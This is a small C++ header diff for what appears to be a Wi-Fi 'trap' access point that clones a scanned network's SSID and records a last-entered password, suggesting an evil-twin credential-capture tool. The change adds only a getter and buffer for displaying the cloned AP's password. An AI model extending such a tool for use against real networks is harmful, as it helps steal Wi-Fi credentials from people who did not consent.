@@ -29,6 +29,12 @@ public:
    * If the scanned network has encryption, AP will use TRAP_AP_PASSWORD. */
   void setClonedSSID(int scanIndex);
   const char *getClonedSSID() const { return clonedSSID_; }
+  /** AP password when cloning encrypted network (for display). nullptr if open. */
+  const char *getCloneApPassword() const {
+    return useApPassword_ && cloneApPasswordDisplay_[0] != '\0'
+               ? cloneApPasswordDisplay_
+               : nullptr;
+  }
 
 private:
   void setupHandlers();
@@ -40,6 +46,7 @@ private:
   char lastPassword_[TRAP_LAST_PASSWORD_LEN];
   unsigned long lastPasswordShowUntil_ = 0;
   char clonedSSID_[33];
+  char cloneApPasswordDisplay_[32];  // copy for getCloneApPassword()
   bool useClonedSSID_ = false;
   bool useApPassword_ = false;  // true when cloned network had encryption
 };
